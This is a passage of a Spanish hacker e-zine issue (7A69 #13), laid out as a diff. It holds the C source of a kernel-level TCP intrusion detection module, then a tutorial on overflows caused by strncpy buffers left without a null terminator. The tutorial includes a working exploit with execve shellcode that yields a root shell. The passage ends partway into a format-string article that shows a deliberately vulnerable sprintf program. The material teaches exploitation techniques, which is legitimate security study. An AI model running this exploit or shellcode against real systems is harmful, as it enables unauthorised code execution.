@@ -1,0 +1,2012 @@
+         -=( 7A69#13 )=--=( art13 )=--=( Cortos )=--=( Varios )=-
+     
+Y en esta seccion, como siempre, encontrareis mini-articulillos, que, 
+creemos, tambien pueden ser de intres :)
+
+  1.- Un IDS a nivel de kernel.          - ZiSXko
+  2.- Buffers overflow, por buffers sin
+      caracter nulo.                     - Ripe
+  3.- Buffers overflow, por bug de
+      formato.                           - Ripe
+  4.- ICMP-Shell atraves del kernel.     - ZiSXko
+  5.- Pachanga sysrq patch.              - Trycky
+
+
+-------------------------------------------------------------------------------
+---/ 1 /--/ Un IDS a nivel de kernel. /--/ ZiSXko /----------------------------
+-------------------------------------------------------------------------------
+
+
+1.- Un IDS a nivel de kenrel
+----------------------------
+  
+La programacion a nivel de kernel es la programacion que a todo el mundo que
+le guste programar Sistemas operativos es la mas bonita y la mas interesante,
+encontrarse con las estructuras del kernel que vemos en los articulos o 
+libros de cualquier unix y poder jugar con los inodos y demas estructuras pues 
+mola mucho la verdad, tambien es cierto que la probabilidad de cargarnos 
+nuestro bonito Linux aumenta considerablemente. En el ejemplo que pongo vamos 
+a tocar una parte de la Pila TCP de Linux y el acceso al /proc, el siguiente 
+programa es un IDS(Intrussion Detection System) a nivel kernel que obviamente 
+tiene defectos y virtudes como todos los programas.
+
+El programa consta de un modulo ids_kernel.c, un fichero de cabezera
+ids_kernel.h y un fichero idsrule.c.
+
+ids_kernel.c es la parte que se va ha quedar residente en el Kernel y el cual
+atraves de un fichero temporal recivira los datos del area de Usuario.
+ids_kernel.h tiene dos estructuras declaradas y una de ellas se utiliza para
+hacer el swap del area de usuario al area del kernel, ya se sabe de modo
+usuario a modo protegido en arquitecturas x86.
+
+idsrule.c es el programa con el que interactuaremos nosotros, donde
+realizaremos un script y tendremos las reglas a monitorizar
+por ejemplo un ejemplo de regla podria ser el siguiente:
+idsrule -IN -syn -dport 21 -msg "Intento de Telnet"
+idsrule -IN -syn -urg -dport 139 -msg "Posible WinNuke"
+idsrule -IN -msg "Paquete Nulo"
+......
+
+2.- El codigo
+-------------
+
+---/ ids_kernel.c /---
+
+/* ids_kernel.c
+ * ziSXko Chistems Presents, un Reconocedor de patrones TCP un IDS cutre
+ * Compilar con
+ * gcc ids_kernel.c -c -fomit-frame-pointer -O2 -I/usr/src/linux/include
+ * gcc ids_kernel.c -c -Wall -fomit-frame-pointer -O2 -I/usr/src/linux/include
+ * insmod ids_kernel.o
+ * Solo Funciona Sobre Kernels Superiores al 2.4.0 mucho Ojo!
+ */
+#define MODULE
+#define __KERNEL__
+
+#include <linux/version.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/netdevice.h>
+#include <linux/skbuff.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/proc_fs.h>
+#include <linux/malloc.h>
+#include "ids_kernel.h"
+#include <asm/uaccess.h>
+
+#define FICHERO_PROC_USER_KERNEL "kernids"
+#define MAX_BUFFER_USER_KERNEL 1024
+#define VERDADERO 1
+#define FALSO 0
+
+
+char *dispositivo;
+MODULE_PARM(dispositivo,"s"); /* que vamos a leer un parametro y es un string
+*/
+
+struct packet_type proto;
+struct device *dispo;
+struct regla_TCP *tcpRuleIN=NULL;
+struct regla_TCP *tcpRuleOUT=NULL;
+struct proc_dir_entry *ent;
+
+/****************************************************************/
+/*								*/
+/*	Funciones para el Acceso al /proc			*/
+/*								*/
+/****************************************************************/
+
+static ssize_t salida_fichero_swap(struct file *file,char *buf,size_t
+len,loff_t *offset)
+{
+	/*	En principio no damos las reglas para verlas */
+	static int finished=0;
+	char buffer[MAX_BUFFER_USER_KERNEL];
+	int i;
+
+	if(finished)
+	{
+		finished=0;
+		return 0;
+	}
+
+
+	memset(&buffer,0,MAX_BUFFER_USER_KERNEL);
+
+        stats_TCP.reglas_activas=stats_TCP.reglas_in + stats_TCP.reglas_out;
+        sprintf(buffer,"Reglas TCP Activas = %d\n",stats_TCP.reglas_activas);
+        sprintf(buffer,"%sReglas TCP IN = %d\n",buffer,stats_TCP.reglas_in);
+        sprintf(buffer,"%sReglas TCP OUT = %d\n",buffer,stats_TCP.reglas_out);
+        sprintf(buffer,"%sPaquetes TCP Reconocidos IN =
+%d\n",buffer,stats_TCP.pkt_reconocidos_in);
+        sprintf(buffer,"%sPaquetes TCP Reconocidos OUT =
+%d\n",buffer,stats_TCP.pkt_reconocidos_out);
+        sprintf(buffer,"%sPaquetes TCP Examinados =
+%d\n",buffer,stats_TCP.pkt_examinados);
+
+	for(i=0;i<len && buffer[i];i++)
+		put_user(buffer[i],buf+i);
+	finished=1;
+	return i;
+}
+
+static ssize_t entrada_fichero_swap(struct file *file,const char *buf,size_t
+lenght,loff_t *offset)
+{
+	/*	Han añadido desde el area de usuario una nueva Regla */
+        struct Regla_TCP *newtcp,tcpaux;
+	int aux;
+
+        newtcp=(struct Regla_TCP*)kmalloc(sizeof(struct Regla_TCP),GFP_KERNEL);
+
+        aux=copy_from_user(&tcpaux,buf,sizeof(tcpaux));
+
+        newtcp->destino=tcpaux.destino;
+        newtcp->ack=tcpaux.ack;
+        newtcp->syn=tcpaux.syn;
+        strncpy(newtcp->mensaje,tcpaux.mensaje,1024);
+        newtcp->fin=tcpaux.fin;
+        newtcp->psh=tcpaux.psh;
+        newtcp->urg=tcpaux.urg;
+        newtcp->rst=tcpaux.rst;
+        newtcp->puerto_destino=tcpaux.puerto_destino;
+        newtcp->puerto_origen=tcpaux.puerto_origen;
+
+        switch(newtcp->destino)
+        {
+                case PKT_IN:
+                        newtcp->next=tcpRuleIN;
+                        tcpRuleIN=newtcp;
+                        stats_TCP.reglas_in++;
+                        break;
+                case PKT_OUT:
+                        newtcp->next=tcpRuleOUT;
+                        tcpRuleOUT=newtcp;
+                        stats_TCP.reglas_out++;
+                        break;
+        }
+
+        /*muestra_regla(newtcp);
+        printk("Regla Añadida\n");*/
+	return 1;
+}
+
+static int fichero_swap_permisos(struct inode *inode,int op)
+{
+	/* op==4 es lectura , op==2 es escritura y solo puede hacerlo el root */
+	if(op==4||(op==2 && current->euid==0))
+		return 0;
+	return -EACCES;
+}
+
+int abrir_fichero_swap(struct inode *inode,struct file *file)
+{
+	MOD_INC_USE_COUNT;
+	return 0;
+}
+
+int cierra_fichero_swap(struct inode *inode,struct file *file)
+{
+	MOD_DEC_USE_COUNT;
+	return 0;
+}
+
+static struct file_operations Operaciones_fichero_swap = {
+        read:salida_fichero_swap,
+        write:entrada_fichero_swap,
+        open:abrir_fichero_swap,
+        release:cierra_fichero_swap
+};
+
+static struct inode_operations Operaciones_sobre_Inodo_swap = {
+	create:&Operaciones_fichero_swap,
+	permission:fichero_swap_permisos
+};
+
+static struct proc_dir_entry Entrada_fichero_Proc_swap = {
+	0,
+        7,
+        FICHERO_PROC_USER_KERNEL,
+        S_IFREG|S_IRUGO|S_IWUSR,
+        1,
+        0,
+        0,
+	MAX_BUFFER_USER_KERNEL,
+        &Operaciones_sobre_Inodo_swap,
+        &Operaciones_fichero_swap,
+        NULL
+};
+
+/****************************************************************/
+/*								*/
+/*	Funciones para el Acceso al Sk_buff			*/
+/*								*/
+/****************************************************************/
+
+
+int detecta(struct sk_buff *skb,struct device *dv,struct packet_type *pt)
+{
+	struct iphdr *iph;
+	struct tcphdr *tcph;
+	struct udphdr *udph;
+
+	__u32	ip_origen;
+	__u32	ip_destino;
+	__u16	sport;
+	__u16	dport;
+
+
+        if(skb->nh.iph->version!=4)
+        {
+                kfree_skb(skb);
+                return 0;
+        }
+
+        iph=skb->nh.iph;
+
+        /* El paquete bien sin formato, hay que reajustarlo ;-)*/
+        skb->h.raw = skb->nh.raw +skb->nh.iph->ihl*4;
+        skb->data = (unsigned char *)skb->h.raw +(skb->h.th->doff <<2);
+        skb->len -= skb->nh.iph->ihl*4 +(skb->h.th->doff << 2);
+
+        ip_origen=skb->nh.iph->saddr;
+        ip_destino=skb->nh.iph->daddr;
+
+        switch(skb->nh.iph->protocol)
+        {
+     	        case 1:/*Protocolo ICMP*/
+      		        printk(KERN_INFO"Interceptando pakete ICMP\n");
+ 		        break;
+     	        case 6:/*Protocolo TCP */
+      		        /*printk(KERN_INFO"Interceptando pakete TCP\n");*/
+                        tcph=(struct tcphdr*)((__u32 *)skb->nh.iph+skb->nh.iph-
+>ihl);
+                        switch(skb->pkt_type)
+                        {
+                                case PACKET_HOST:
+                                        procesa_paquete_tcp
+(tcph,ip_origen,ip_destino,tcpRuleIN);
+                                        break;
+                                case PACKET_OUTGOING:
+                                        procesa_paquete_tcp
+(tcph,ip_origen,ip_destino,tcpRuleOUT);
+                                        /*printk("PACKET_OUTGOING\n");*/
+                                        break;
+                        }
+      		        break;
+                case 17:/*Protocolo UDP */
+                        printk(KERN_INFO"Interceptando pakete UDP\n");
+                        break;
+                case 2:/*Protocolo IGMP */
+                        printk(KERN_INFO"Interceptando paquete iGMP\n");
+                        break;
+     	        default:
+		        kfree_skb(skb);
+		        return 0;
+        }
+        kfree_skb(skb);
+	return 0;
+
+}
+
+/****************************************************************/
+/*								*/
+/*	Funciones para el tratamiento del Paquete TCP/IP	*/
+/*								*/
+/****************************************************************/
+
+int procesa_paquete_tcp(struct tcphdr *tcph,__u32 ip_orig,__u32 ip_dest,struct
+Regla_TCP *tcpRule)
+{
+        struct Regla_TCP *tcp;
+        int flagsok;
+        int puerto_ok;
+
+        tcp=tcpRule;
+
+        while(tcp!=NULL)
+        {
+                flagsok=FALSO;
+                puerto_ok=FALSO;
+                if((tcp->syn==tcph->syn)&&(tcp->ack==tcph->ack)&&(tcp-
+>fin==tcph->fin)
+                        &&(tcp->rst==tcph->rst)&&(tcp->psh==tcph->psh)&&(tcp-
+>urg==tcph->urg))
+                          {
+                                flagsok=VERDADERO; /* Coinciden los Flags */
+                          }
+
+                if((tcp->puerto_origen==0)&&(tcp->puerto_destino==0))
+                        puerto_ok=VERDADERO;
+
+                if((tcp->puerto_origen!=0)&&(tcp->puerto_destino==0))
+                        if(tcp->puerto_origen==ntohs(tcph->source))
+                                puerto_ok=VERDADERO;
+
+                if((tcp->puerto_origen==0)&&(tcp->puerto_destino!=0))
+                        if(tcp->puerto_destino==ntohs(tcph->dest))
+                                puerto_ok=VERDADERO;
+
+                if((tcp->puerto_origen!=0)&&(tcp->puerto_destino!=0))
+                          if((tcp->puerto_destino==ntohs(tcph->dest))&&(tcp-
+>puerto_origen==ntohs(tcph->source)))
+                                puerto_ok=VERDADERO;
+
+                if((flagsok==VERDADERO)&&(puerto_ok==VERDADERO))
+                {
+                        printk(KERN_ALERT"%s desde %d.%d.%d.%d a
+%d.%d.%d.%d\n",tcp->mensaje,NIPQUAD(ip_orig),NIPQUAD(ip_dest));
+                        if(tcp->destino==PKT_IN)
+                                stats_TCP.pkt_reconocidos_in++;
+                        else
+                                stats_TCP.pkt_reconocidos_out++;
+                }
+
+                stats_TCP.pkt_examinados++;
+
+
+                tcp=tcp->next;
+        }
+
+        return 0;
+}
+
+void muestra_regla(struct Regla_TCP *tcp)
+{
+        printk("PUERTO[ORIGEN(%d)DESTINO(%d)]\n",tcp->puerto_origen,tcp-
+>puerto_destino);
+        printk("FLAGS[SYN(%d)ACK(%d)FIN(%d)",tcp->syn,tcp->ack,tcp->fin);
+        printk("RST(%d)PSH(%d)URG(%d)]\n",tcp->rst,tcp->psh,tcp->urg);
+        printk("MSG(%s)\n",tcp->mensaje);
+}
+
+
+
+/****************************************************************/
+/*								*/
+/*	Funciones para la carga y descarga del Modulo		*/
+/*								*/
+/****************************************************************/
+
+void inicia_estadisticas()
+{
+        stats_TCP.reglas_activas=0;
+        stats_TCP.reglas_in=0;
+        stats_TCP.reglas_out=0;
+        stats_TCP.pkt_reconocidos_in=0;
+        stats_TCP.pkt_reconocidos_out=0;
+        stats_TCP.pkt_examinados=0;
+}
+
+void elimina_reglas(struct Regla_TCP *tcp)
+{
+        struct Regla_TCP *tcpaux;
+
+        while(tcp!=NULL)
+        {
+                tcpaux=tcp;
+                tcp=tcp->next;
+                kfree(tcpaux);
+        }
+}
+
+int init_module(){
+
+	if(dispositivo)
+ 	{
+		dispo=dev_get(dispositivo);
+		if(!dispo)
+		{
+			printk(KERN_WARNING"No se ha encontrado el Dispositvo\n");
+			printk(KERN_WARNING"Se usaran todos \n");
+		}else{
+			printk(KERN_WARNING"IDS en Dispositivo %s\n",dispositivo);
+			proto.dev=dispo;
+		}
+	}else
+		printk(KERN_WARNING"Se Usaran todos los dispositivos\n");
+
+	/*proto.type=htons(ETH_P_ALL);*/
+        proto.type=htons(ETH_P_IP);
+   	proto.func=detecta;
+   	dev_add_pack(&proto);
+   	printk(KERN_NOTICE"Cargando IDS\n");
+        inicia_estadisticas();
+
+        if((ent=create_proc_entry(FICHERO_PROC_USER_KERNEL, S_IRUGO | S_IWUSR,
+NULL))!=NULL)
+        {
+                ent->proc_iops=&Operaciones_sobre_Inodo_swap;
+                ent->proc_fops=&Operaciones_fichero_swap;
+         }else
+         {
+                printk(KERN_WARNING"No se puede Crear el Fichero en /proc\n");
+                printk(KERN_WARNING"El IDS no Funcionara Correctamente\n");
+         }
+
+        return 0;
+}
+
+void cleanup_module(){
+	printk(KERN_NOTICE"Descargando IDS\n");
+	dev_remove_pack(&proto);
+        elimina_reglas(tcpRuleIN);
+        elimina_reglas(tcpRuleOUT);
+        remove_proc_entry(FICHERO_PROC_USER_KERNEL,NULL);
+}
+
+
+/* ids_kernel.h
+ * Estructuras de las Reglas del IDS
+ */
+
+/* Estructura para las Reglas de los mensajes TCP */
+#define PKT_IN 0
+#define PKT_OUT 1
+
+struct Regla_TCP
+{
+        int     destino;
+	unsigned int 	puerto_destino;
+	unsigned int 	puerto_origen;
+        int     syn;
+        int     fin;
+        int     rst;
+        int     ack;
+        int     psh;
+        int     urg;
+        char    mensaje[1024];
+	struct Regla_TCP *next;
+};
+
+
+struct estadisticas_TCP
+{
+        int reglas_activas;
+        int reglas_in;
+        int reglas_out;
+        int pkt_reconocidos_in;
+        int pkt_reconocidos_out;
+        int pkt_examinados;
+}stats_TCP;
+
+---/ ids_kernel.c /---
+
+
+
+---/ idsrule.c /---
+
+/* idsrule.c
+ * Zisxko Chistems Presents IDS Español
+ * Programa que interactua con el fichero /proc/kernids, para pasar parametros
+al
+ * area del Kernel
+ */
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include "ids_kernel.h"
+
+#define MAX_PARAMETROS 12
+
+char *param[MAX_PARAMETROS][3] = {
+        {"-IN","a","-2"},
+        {"-OUT","a","-1"},
+        {"-syn","f","0"},
+        {"-ack","f","1"},
+        {"-fin","f","2"},
+        {"-rst","f","3"},
+        {"-urg","f","4"},
+        {"-fin","f","5"},
+        {"-psh","f","6"},
+        {"-dport","p","7"},
+        {"-sport","p","8"},
+        {"-msg","m","9"}
+};
+
+void Usa()
+{
+        int i;
+        system("clear");
+        printf("ziSXko IDS poguered!\n");
+        printf("Usa las Siguientes Opciones\n");
+        printf("-IN paquetes entrantes\n");
+        printf("-OUT paquetes salientes\n");
+        for(i=0;i<MAX_PARAMETROS;i++)
+        {
+                if(strcmp(param[i][1],"f")==0)
+                        printf("\tFlag %s \n",param[i][0]);
+                if(strcmp(param[i][1],"p")==0)
+                        printf("\tPuerto %s\n",param[i][0]);
+                if(strcmp(param[i][1],"m")==0)
+                        printf("\tMensaje de Alerta %s\n",param[i][0]);
+        }
+        exit(-1);
+}
+
+
+int main(int argc,char *argv[]){
+	char buff[50];
+        char *opt;
+	struct Regla_TCP tcp;
+	int fd,len,i,j,aux;
+
+        if(getuid()!=0)
+        {
+                printf("Tienes que ser rOOt!\n");
+                exit(-1);
+        }
+
+
+        memset(&tcp,0,sizeof(struct Regla_TCP));
+        tcp.destino=-1;
+
+        for(i=1;i<argc;i++)
+                for(j=0;j<MAX_PARAMETROS;j++)
+                        if(strcmp(argv[i],param[j][0])==0)
+                        {
+                                len=atoi(param[j][2]);
+                                switch(len)
+                                {
+                                        case -2:tcp.destino=PKT_IN;continue;
+                                        case -1:tcp.destino=PKT_OUT;continue;
+                                        case 0:tcp.syn=1;continue;
+                                        case 1:tcp.ack=1;continue;
+                                        case 2:tcp.fin=1;continue;
+                                        case 3:tcp.rst=1;continue;
+                                        case 4:tcp.urg=1;continue;
+                                        case 5:tcp.fin=1;continue;
+                                        case 6:tcp.psh=1;continue;
+                                        case 7:
+                                                if(i==argc-1)Usa();
+                                                if((aux=atoi(argv[i+1]))==-
+1)Usa();
+                                                tcp.puerto_destino=aux;
+                                                continue;
+                                        case 8:
+                                                if(i==argc-1)Usa();
+                                                if((aux=atoi(argv[i+1]))==-
+1)Usa();
+                                                tcp.puerto_origen=aux;
+                                                continue;
+                                        case 9:
+                                                if(i==argc-1)Usa();
+                                                sprintf(tcp.mensaje,"%s",argv
+[i+1]);
+                                                continue;
+
+                                        default:Usa();
+                                }
+                        }
+
+        if(tcp.destino==-1)Usa();
+
+/*        printf("Porig(%d),Pdest(%d)",tcp.puerto_origen,tcp.puerto_destino);
+        printf("ACK(%d),SYN(%d),FIN(%d)",tcp.ack,tcp.syn,tcp.fin);
+        printf("RST(%d),URG(%d),PSH(%d)
+(%s)\n",tcp.rst,tcp.urg,tcp.psh,tcp.mensaje);*/
+
+	fd=open("/proc/kernids",O_WRONLY);
+ 	if(fd==-1)
+	{
+		perror("open");
+		exit(-1);
+	}
+
+	len=write(fd,(char *)&tcp,sizeof(tcp));
+	if(len==-1)
+	{
+		perror("write");
+		close(fd);
+		exit(-1);
+	}
+	close(fd);
+        return 0;
+}
+
+---/ idsrule.c /---
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 2 /--/ Buffers overflow, por buffers sin caracter nulo /--/ Ripe /--------
+-------------------------------------------------------------------------------
+
+
+1.-Introduccion
+---------------
+    Años atras, cuando se demostro la existencia de los buffers overflow, una
+gran cantidad de software se vio afectado, pero actualmente los programadores
+se han concienciado mas y han substitudo los strcpy()'s por strncpy()'s, lo 
+que reduce en gran cantidad en riesgo de explotacion, pero no del todo. Lo
+que voy a presentar aqui no es, ni mucho menos, algo que se pueda encontrar
+muy comunmente, pero puede existir.
+
+   Obviamente voy a suponer que conoceis como funcionan los buffers
+overflow convencionales. De no ser asi te remito al documento que Doing y
+yo escribimos en 7a69#9.
+
+
+
+
+2.-strncpy() y el \0
+--------------------
+    Como ya he dicho strncpy() se ha afianzado como una solucion facil y 
+rapida a los buffer overflow, sinembargo no es oro todo lo que reluce y 
+algunos programadores siguen haciendo el tonto y dejando brechas de seguridad
+en sus programas (pese a usar strncpy()).
+
+    El caso es que hay muchas funciones que interpretan el caracter nulo
+como final de cadena, y un programador no puede asegurar que tras hacer
+un strncpy() haya un caracter nulo al final, pues, como se puede leer en la 
+man page, si el tamaño del buffer de origen coincide con maximo numero de
+bytes a copiar no se colocara el \0 por ningun lado.
+
+   Para que quede clara la sosa vamos a ver un ejemplo muy sencillo en el 
+que declaramos dos buffers, los llenamos y luego sacamos uno de ellos por
+pantalla.
+
+---/ test1.c /---
+
+int main(int argc, char **argv) {
+  char buf1[8];
+  char buf2[8];
+  if (argc<3) exit(0);
+  strncpy(buf1, argv[1], 8);
+  strncpy(buf2, argv[2], 8);
+  printf("%s\n", buf2); 
+}
+
+---/ test1.c /---
+
+   Vamos a probar nuestro programilla...
+
+    barracuda~# ./test1 12 1234567
+    1234567
+    barracuda~# ./test1 123 12345678
+    12345678123
+
+   Oops, ha ocurrido algo raro, fijaos que en el segundo caso se ha imprimido
+la segunda cadena y acto seguido la primera. ¿Porque ha ocurrido esto?
+Sencillo, porque en el strncpy(buf2, argv[2], 8); argv[2] tiene un tamaño de
+8 bytes y strncpy no permite que se copien mas de 8 bytes, por lo que el 
+caracter nulo no se puede situar en ninguna parte, y el parametro %s de
+printf le dice que imprima hasta encontrar el proximo NULL. Veamos 
+graficamente lo que tendriamos en la pila.
+
+           Primera ejecucion              Segunda ejecucion
+
+                [     ]                        [     ]
+		[     ]                        [     ]
+		[     ]                        [     ]
+		[     ]                        [     ]
+	        [     ]                        [  0  ]
+	        [  0  ]                        [ '3' ]
+	        [ '2' ]                        [ '2' ]
+	 buf1-> [ '1' ]                 buf1-> [ '1' ]
+	        [  0  ]                        [ '8' ]
+                [ '7' ]                        [ '7' ]
+                [ '6' ]                        [ '6' ]
+                [ '5' ]                        [ '5' ]
+                [ '4' ]                        [ '4' ]
+                [ '3' ]                        [ '3' ]
+                [ '2' ]                        [ '2' ]
+         buf2-> [ '1' ]                 buf2-> [ '1' ]
+
+
+
+
+3.- Un programa vulnerable
+--------------------------
+    El programa test1.c que hemos visto anteriormente, pese a presentar un
+problema no es explotable, pues el buffer que tendra un tamaño superior a 
+lo previsto se imprime por salida standar. ¿Pero que ocurriria si en lugar
+de usar printf usasemos sprintf? Con el siguiente ejemplo quedara mas 
+clara la cosa.
+
+---/ vuln1.c /---
+
+void crea_msg_buf(char *msg) {
+  char lbuf[8+1024];
+  sprintf(lbuf,"Message %s", msg);
+  printf("%s\n", lbuf);
+}
+
+int main(int argc, char *argv) {
+  char buf1[16];
+  char buf2[1024];
+  if (argc<3) exit(0);
+  strncpy(buf1, argv[1], 16);
+  strncpy(buf2, argv[2], 1024);
+  crea_msg_buf(buf2);
+  exit(0);
+}
+
+---/ vuln1.c /---
+
+    El buffer declarado en crea_msg_buf es de 1032 (1024 por mgs y 8 por lo 
+que cupa la cadena "Message"), lo que aparentemente libra a la funcion de ser 
+vulnerable. Pero no. Con lo que sabemos ahora vemos claramente que la funcion 
+crea_msg_buf puede llevar a la ejecucion de codigo arbitrarrio, pues nadie
+nos asegura que encontraremos un caracter nulo antes de que los 1024 de
+buf2 terminen.
+
+
+
+4.- La explotacion
+------------------
+   ¿Como tendriamos que explotarlo? Pues muy sencillo. Colocamos una 
+shellcode en environ (lo que hara que este en una posicion de memoria 
+cercana a 0xC0000000), llenamos buf2 de caracteres no nulos, y metemos en
+buf1 8 bytes, de los cuales los 2 ultimos corresponderan a la direccion de
+retorno.
+
+---/ expl1.c /---
+
+#include <stdio.h>
+#include <unistd.h>
+
+#define ENVBUF_SIZE     8192
+#define EVILBUF1_SIZE      8
+#define EVILBUF2_SIZE   1024
+#define NOP             0x90
+#define RET_ADDR        0xBFFFFF50  /* Por ahi suele estar environ :) */
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh\0";
+
+int main(int argc, char **argv) {
+  char *exec_argv[4];
+  char *exec_envp[2];
+  char envbuf[ENVBUF_SIZE+1];
+  char evilbuf1[EVILBUF1_SIZE+1];
+  char evilbuf2[EVILBUF2_SIZE+1];
+  unsigned long *ret=&evilbuf1[4];
+  if (argc<2) {
+    printf("Usage: %s <prog>\n", argv[0]);
+    exit(0);
+  }
+  memset(envbuf, 0, ENVBUF_SIZE+1);
+  memset(envbuf, NOP, ENVBUF_SIZE);
+  memset(evilbuf1, 0, EVILBUF1_SIZE+1);
+  memset(evilbuf1, 'A', EVILBUF1_SIZE);
+  memset(evilbuf2, 0, EVILBUF2_SIZE+1);
+  memset(evilbuf2, 'A', EVILBUF2_SIZE);
+  memcpy(envbuf, "ENV=", 4);
+  memcpy(envbuf+(ENVBUF_SIZE-strlen(shellcode)), shellcode, strlen(shellcode));
+  (*ret)=RET_ADDR;
+  exec_argv[0]=argv[1];
+  exec_argv[1]=evilbuf1;
+  exec_argv[2]=evilbuf2;
+  exec_argv[3]=NULL;
+  exec_envp[0]=envbuf;
+  exec_envp[1]=NULL;
+  printf("Exploting...\n");
+  execve(argv[1], exec_argv, exec_envp);
+  printf("Something bad!\n");
+}
+
+---/ expl1.c /---
+
+   Veamos si este sencillo explit, explota bien vuln1.c.
+
+    barracuda ~# ./expl1 vuln1
+    Exploting...
+    Message AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPÿÿ¿
+    sh-2.05#
+
+   BINGO!! Aqui tenemos nuestra shell... Sencillo, no?
+
+
+
+5.- Despedida
+-------------
+   Como ya he dicho la tecnica aqui presentada es MUY poco comun, pues deben
+darse bastantes condiciones para que un programa sea explotable, sinembargo
+ahi esta para que lo expliquemos :)
+
+   Para solucionar este tipo de fallos basta con declarar los buffers con
+un bytes mas, y segurarnos que ese byte sea un caracter nulo.
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 3 /--/ Buffer overflow, por bug de formato. /--/ Ripe /-------------------
+-------------------------------------------------------------------------------
+
+1.-Introduccion
+---------------
+
+     Muy posiblemente hayais leido ultimamente sobre los bugs de formato y
+sus posibles formas de explotacion. Si es asi, he de deciros que este articulo
+no os aportara nada nuevo, pero ya que he decidido contar formas alternativas
+de desbordar un buffer he decidido re-explicar algo que ya se ha publicado
+en algun otro lado anteriormente, espero que no me flameeis por ello (recordad
+que podeis ignorar el documento y no seguir leyendo, nadie os obliga).
+
+     Por otro lado, he de decir que esta forma de explotar los bugs de formato
+es MUY poco comun, por lo que si quieres aprender formas de explotacion mas
+comunes e intresantes te remitire al doc que Doing escribio hace ya tiempo
+para SET.
+
+
+
+2.-Algun concepto sobre *printf
+-------------------------------
+
+     Los bugs de formato suelen darse en funciones que aceptan una entrada de
+formato y sus parametros, por lo que esas funciones que hagan uso de la va_list
+son susceptibles a ser explotadas, y entre ellas se encuentran printf, sprintf
+y compañia. Dichas funciones aceptan un argumento que es un array en la que
+se realizaran substituciones de formato en parejas de caracteres tales como
+%s, %i, %c, etc. Si quieres mas informacion sobre el funcionamiento de este
+tipo de funciones pudes encontrar muchisima informacion en la pagina man y en
+el codigo fuente de la glibc.
+
+     En el caso de explotacion que voy a explicar queremos desbordar un
+buffer, por lo que nos intresan unicamente las funciones que esciben sobre
+un buffer como puede ser sprintf, cuyo primer parametro es el buffer al que
+queremos copiar el formato, el segundo parametro es el formato y el resto
+son los argumentos pasados para el formato. ¿Que ocurre si en la cadena de
+formato se solicitan una serie de parametros que realmente no se pasan?
+Sencillo, sprintf no se da cuenta, por lo que usara los valores que hay
+actualmente en la pila y actuara normalmente, eso quiere decir que situaciones
+como la siguiente pueden ser perfectamente posibles.
+
+     sprintf(buf, "%i%i%i");
+
+NOTA: Se esta desarroyando, de echo ya esta hecha pero pocos sistemas la tienen
+      una libc que controla el numero de parametros solicitado y el numero de
+      paramtros pasado para detectar errores de este tipo, por lo que es MUY
+      posible que los bugs de formato tengan los dias contados.
+		  
+
+
+
+3.-¿Cuando y como es explotable?
+--------------------------------
+
+     Podriamos decir, basicamente que un programa que usa este tipo de
+funciones es explotable cuando el usuario del mismo puede ser capaz de alterar
+o crear el buffer que describe el formato. Un ejemplo de programa explotable
+seria el siguiente.
+
+---/ vulnerable.c /---
+
+#include <stdio.h>
+
+#define BZ 256
+
+int main(int argc, char **argv) {
+  char buf2[BZ+1];
+  char buf1[BZ+1];
+  if (argc<2) exit(0);
+  memset(buf1, 0, BZ+1);
+  memset(buf2, 0, BZ+1);
+  strncpy(buf1, argv[1], BZ);
+  sprintf(buf2, buf1);
+  printf("%s\n", buf2);
+}
+
+---/ vulnerable.c /---
+		
+
+     Como podeis ver en el sprintf() se pretende copiar el contenido del buf1
+en el buf2, cosa que no parece ser peligrosa. Pero si nos damos cuenta, veremos
+que buf1 sera interpretado como un string de formato, por lo que parejas de
+caracteres como %s, %x, etc seran substituidas... ¿Substituidas porque? Pues
+extraera los valores que haya en la pila, como si se hubieran pasado como
+parametro. De todos modos, para exte tipo de explotacion de bugs de formato no
+es necesario tener en cuenta los valores de la pila, solo el echo de que el
